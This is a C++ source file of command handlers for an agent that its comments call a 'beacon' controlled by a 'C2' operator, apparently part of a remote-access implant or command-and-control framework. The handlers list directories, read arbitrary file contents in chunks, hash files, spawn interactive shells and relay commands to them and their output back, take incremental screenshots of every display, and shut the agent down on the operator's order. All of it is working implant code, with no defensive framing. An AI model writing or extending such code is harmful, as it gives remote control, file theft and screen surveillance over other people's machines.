#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "vector.h"
#include "system_info.h"
#include "shell.h"

// =============================================================================
// Wire helpers
// =============================================================================

#pragma pack(push, 1)
struct WireDirectoryEntry
{
    CHAR16 Name[256];
    UINT64 CreationTime;
    UINT64 LastModifiedTime;
    UINT64 Size;
    UINT32 Type;
    BOOL IsDirectory;
    BOOL IsDrive;
    BOOL IsHidden;
    BOOL IsSystem;
    BOOL IsReadOnly;
};
#pragma pack(pop)

static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
{
    StringUtils::WideToChar16(
        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
        Span<CHAR16>(dst.Name, 256));
    dst.CreationTime = src.CreationTime;
    dst.LastModifiedTime = src.LastModifiedTime;
    dst.Size = src.Size;
    dst.Type = src.Type;
    dst.IsDirectory = src.IsDirectory;
    dst.IsDrive = src.IsDrive;
    dst.IsHidden = src.IsHidden;
    dst.IsSystem = src.IsSystem;
    dst.IsReadOnly = src.IsReadOnly;
}

static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return 0;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;

    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return len;
}

static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = code;
}

static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

// =============================================================================
// Command handlers
// =============================================================================

VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    WCHAR directoryPath[1024];
    DecodeWirePath(command, commandLength, directoryPath, 1024);
    LOG_INFO("GetDirectoryContent: %ws", directoryPath);

    auto result = DirectoryIterator::Create(directoryPath);
    if (!result)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    DirectoryIterator &iter = result.Value();
    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    while (iter.Next())
    {
        const DirectoryEntry &entry = iter.Get();
        if (IsDotEntry(entry))
            continue;
        if (!entries.Add(entry))
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
    }

    UINT64 entryCount = (UINT64)entries.Count;
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
    *response = new CHAR[*responseLength];

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));

    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
    for (UINT64 i = 0; i < entryCount; i++)
    {
        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
        ToWireEntry(entries.Data[i], wireEntries[i]);
    }
}

// Reads a chunk of file content
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
    LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
    *response = new CHAR[*responseLength];

    auto setOffsetResult = file.SetOffset((USIZE)offset);

    if(!setOffsetResult){
        LOG_ERROR("Failed to set file offset: %llu, error: %e", offset, setOffsetResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    auto readResult = file.Read(Span<UINT8>((UINT8 *)(*response + sizeof(UINT32) + sizeof(UINT64)), (USIZE)readCount));

    UINT32 bytesRead = readResult ? readResult.Value() : 0;

    *(PUINT32)*response = StatusCode::StatusSuccess;
    *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
}

// Computes the SHA-256 hash of a file chunk
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
    LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];

    SHA256 sha256;
    USIZE totalRead = 0;
    // Read file in small chanks and update the hash untill we read the requested count or reach the end of file
    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        auto setOffsetResult = file.SetOffset((USIZE)(offset + totalRead));

        if (!setOffsetResult)
        {
            LOG_ERROR("Failed to set file offset: %llu", offset + totalRead);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            delete[] buffer;
            return;
        }

        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        UINT32 bytesRead = readResult ? readResult.Value() : 0;
        if (bytesRead == 0)
            break;
        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;
    *responseLength += SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
}

// Open (spawn) a shell. Request: (none). Response: [status:4][shellId:8].
// The beacon assigns the slot id (first free slot) and returns it; the C2 must
// reuse it for Read/Write/Close.
VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    auto openResult = context->shellManager.Open();
    if (!openResult)
    {
        LOG_ERROR("Failed to open shell (error: %e)", openResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = openResult.Value();
    *responseLength = sizeof(UINT32) + sizeof(ShellId);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &shellId, sizeof(shellId));
}

// Writes a command to a shell. Payload: [shellId:8][UTF-8 input + '\0']
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("WriteShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    PCHAR input = command + sizeof(ShellId);
    USIZE inputLength = commandLength - sizeof(ShellId);
    LOG_INFO("WriteShell: id=%llu bytes=%llu", shellId, (UINT64)inputLength);

    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("WriteShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Trim for null terminator
    while (inputLength > 0 && input[inputLength - 1] == '\0')
        inputLength--;

    auto writeResult = shell->Write(input, inputLength);
    if (!writeResult)
    {
        LOG_ERROR("Failed to write command to shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
}

// Reads a chunk of data from a shell's stdout. Payload: [shellId:8]
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("ReadShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("ReadShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Buffer to hold the data read from the shell
    CHAR buffer[4096];
    auto readResult = shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        LOG_ERROR("Failed to read from shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    USIZE bytesRead = readResult.Value() + 1;
    *responseLength += bytesRead;
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), bytesRead), Span<const CHAR>(buffer, bytesRead));
}

// Close a shell instance. Payload: [shellId:8]. Idempotent.
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("CloseShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    context->shellManager.Close(shellId);

    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
}

// Exit - gracefully terminate the agent.
//
// Acknowledges the operator, then signals the main loop to tear down. The main
// loop sends this ACK, exits both of its while (!context.shouldExit) loops, and
// returns from start(); WebSocketClient is released when it goes out of scope, and
// Context::~Context frees any shell/screen-capture state before entry_point() calls
// ExitProcess(). No platform-specific code lives here: termination flows through
// the existing ExitProcess() abstraction, so this command is uniform across all
// targets (on UEFI, ExitProcess() maps to EfiResetShutdown and powers off).
VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Exit: operator requested agent termination");
    // Acknowledge so the operator knows the exit was received and will be honored.
    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;

    // Signal the main loop to stop after sending this response.
    context->shouldExit = true;
}

// Gets the list of display devices and their information
VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    auto displays = Screen::GetDevices();
    if (!displays)
    {
        LOG_ERROR("Failed to enumerate display devices");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ScreenDeviceList &deviceList = displays.Value();
    context->screenCaptureContext->DeviceList = deviceList;

    *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &deviceList.Count, sizeof(deviceList.Count));
    Memory::Copy(*response + sizeof(UINT32) + sizeof(deviceList.Count), deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice)));
}

// Callback function for JPEG encoding - called by the encoder to write encoded data chunks
VOID JpegCallback(PVOID context, PVOID data, INT32 size)
{
    JpegBuffer *jpegBuffer = (JpegBuffer *)context;

    if (data == nullptr)
        jpegBuffer->Initialize(size);

    if (jpegBuffer->offset + size > jpegBuffer->size)
    {
        UINT32 newSize = Math::Max(jpegBuffer->size * 2, jpegBuffer->size + size);
        PUINT8 newBuffer = new UINT8[newSize];
        Memory::Copy(newBuffer, jpegBuffer->outputBuffer, jpegBuffer->offset);
        delete[] jpegBuffer->outputBuffer;
        jpegBuffer->outputBuffer = newBuffer;
        jpegBuffer->size = newSize;
    }
    Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
    jpegBuffer->offset += (UINT32)size;
}

// Gets a screenshot of the specified display device
VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    auto displayIndex = *(PUINT32)(command);
    auto quality = *(PUINT32)(command + sizeof(UINT32));
    auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));
    LOG_INFO("GetScreenshot: display=%u quality=%u fullScreen=%u", displayIndex, quality, isFullScreen);

    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    if (context->screenCaptureContext->DeviceList.Count == 0)
    {
        auto displays = Screen::GetDevices();
        if (!displays)
        {
            LOG_ERROR("Failed to enumerate display devices");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->screenCaptureContext->DeviceList = displays.Value();
    }

    const ScreenDevice &device = context->screenCaptureContext->DeviceList.Devices[displayIndex];

    if (context->screenCaptureContext->GraphicsList.count == 0)
        context->screenCaptureContext->GraphicsList.Init(context->screenCaptureContext->DeviceList.Count);

    Graphics &graphics = context->screenCaptureContext->GraphicsList.graphicsArray[displayIndex];

    if (!graphics.IsInitialized())
        graphics.Init(device);

    if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height)))
    {
        LOG_ERROR("Failed to capture the screen for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // In case of full screen request, encode the whole screenshot as JPEG and send it back
    if (isFullScreen)
    {
        graphics.jpegBuffer.Reset();
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
        if (encodeResult.IsErr())
        {
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

        Rectangle rect(0, 0, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);

        UINT32 countOfSegments = 1;

        *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + graphics.jpegBuffer.offset;
        *response = new CHAR[*responseLength];
        *(PUINT32)*response = StatusCode::StatusSuccess;
        Memory::Copy(*response + sizeof(UINT32), &countOfSegments, sizeof(UINT32));
        rect.toBuffer((UINT8 *)*response + sizeof(UINT32) + sizeof(UINT32));
        return;
    }

    // Threshold of 24 ignores minor JPEG compression artifacts from prior frames
    ImageProcessor::CalculateBiDifference(Span<const RGB>(graphics.currentScreenshot, device.Width * device.Height),
                                          Span<const RGB>(graphics.screenshot, device.Width * device.Height),
                                          device.Width, device.Height,
                                          Span<UCHAR>(graphics.bidiff, device.Width * device.Height),
                                          24);

    // Find dirty rectangles using tile-based detection (replaces RemoveNoise + FindContours)
    auto dirtyResult = ImageProcessor::FindDirtyRects(
        Span<const UINT8>(graphics.bidiff, device.Width * device.Height),
        device.Width, device.Height, 64);
    if (dirtyResult.IsErr())
    {
        LOG_ERROR("Failed to find dirty rectangles for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    auto &dirtyRects = dirtyResult.Value();

    UINT32 countOfRects = 0;
    USIZE offset = sizeof(UINT32) + sizeof(UINT32);

    // Pre-allocate response buffer with generous initial capacity to avoid per-rect reallocation.
    USIZE packetCapacity = *responseLength + sizeof(UINT32) + (USIZE)device.Width * device.Height / 2;
    PCHAR packet = new CHAR[packetCapacity];

    for (UINT32 i = 0; i < dirtyRects.Count; i++)
    {
        const DirtyRect &dr = dirtyRects.Rects[i];
        INT32 rectWidth = (INT32)dr.Width;
        INT32 rectHeight = (INT32)dr.Height;

        countOfRects++;

        for (INT32 j = 0; j < rectHeight; j++)
            Memory::Copy(graphics.rectBuffer + j * rectWidth, graphics.currentScreenshot + (dr.Y + j) * device.Width + dr.X, (USIZE)rectWidth * sizeof(RGB));

        graphics.jpegBuffer.Reset();
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, rectWidth, rectHeight, 3, Span<const UINT8>((UINT8 *)graphics.rectBuffer, rectWidth * rectHeight * sizeof(RGB)));
        if (encodeResult.IsErr())
        {
            delete[] packet;
            dirtyRects.Free();
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        USIZE rectEntrySize = graphics.jpegBuffer.offset + sizeof(UINT32) * 3; // x + y + sizeOfData + jpegData
        // Grow the packet buffer if needed (double capacity until it fits)
        if (offset + rectEntrySize > packetCapacity)
        {
            USIZE newCapacity = packetCapacity;
            while (offset + rectEntrySize > newCapacity)
                newCapacity *= 2;
            auto newPacket = new CHAR[newCapacity];
            Memory::Copy(newPacket, packet, offset);
            delete[] packet;
            packet = newPacket;
            packetCapacity = newCapacity;
        }

        Rectangle rect(dr.X, dr.Y, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);
        offset += rect.toBuffer((UINT8 *)packet + offset);
    }

    // Copy the current screenshot to the screenshot buffer for the next comparison
    Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

    *(PUINT32)(packet + sizeof(UINT32)) = countOfRects;
    *response = packet;
    *responseLength = offset;
    *(PUINT32)*response = StatusCode::StatusSuccess;

    dirtyRects.Free();
}
